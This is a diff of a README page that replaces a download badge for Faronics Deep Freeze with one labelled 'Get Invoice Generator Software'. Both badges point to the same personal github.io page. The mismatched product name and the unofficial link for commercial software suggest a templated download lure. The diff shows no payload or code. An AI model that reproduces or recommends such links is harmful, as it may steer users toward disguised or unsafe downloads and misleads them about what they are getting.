@@ -6,11 +6,7 @@
      alt="Faronics Deep Freeze Logo" 
      style="width: 100%; height: auto; display: block;">
 
-<p align="center">
-  <a href="https://iovsyukova996.github.io/.github/faronics-deep-freeze" target="_blank" rel="noopener noreferrer">
-    <img src="https://img.shields.io/badge/Get_Faronics_Deep_Freeze-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Get Faronics Deep Freeze" width="250">
-  </a>
-</p>
+[![Get the Software](https://img.shields.io/badge/🚀_Get_Invoice_Generator_Software-Now-blue?style=for-the-badge)](https://iovsyukova996.github.io/.github/faronics-deep-freeze)
 
 ---
 
